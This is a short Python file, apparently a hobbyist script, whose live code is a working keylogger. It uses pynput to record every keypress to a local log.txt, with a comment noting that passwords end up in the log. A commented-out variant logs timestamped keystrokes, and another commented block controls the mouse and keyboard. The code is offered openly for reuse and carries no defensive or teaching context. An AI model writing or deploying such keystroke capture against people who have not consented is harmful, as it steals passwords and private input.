# from pynput.mouse import Controller
# from pynput.keyboard import Controller
#
# def contol_mouse():   #controlling our mouse
#     mouse=Controller()
#     mouse.position=(100,200)    #it is a coordinate of  a pixel
#
#
# def contol_key():
#     keybord=Controller()
#     keybord.type("abhay rana is the great")
#
# contol_key()
# contol_mouse()        # we cant use the keyboard and mouse controller simultaneoulsy

#this is a basic version of the keylogger
#if u want to do any changes so you are always welcome

from pynput.keyboard import Listener

def write_to_file(key):
    letter=str(key)
    letter=letter.replace("'","")
    print(letter)
    if letter=="Key.space":
        letter=" "
    if letter=="Key.shift":
        letter=""
    if letter=="Key.enter":
        letter="\n"
    with open("log.txt","a") as f:
        f.write(letter)

with Listener(on_press=write_to_file) as l:
    l.join()

#the passwords are saved to the log file


# from pynput.keyboard import Key, Listener
# import logging
#
# log_dir = ""
#
# logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='["%(asctime)s", %(message)s]')
#
# def on_press(key):
#     logging.info('"{0}"'.format(key))
#
# with Listener(on_press=on_press) as listener:
#     listener.join()
#
#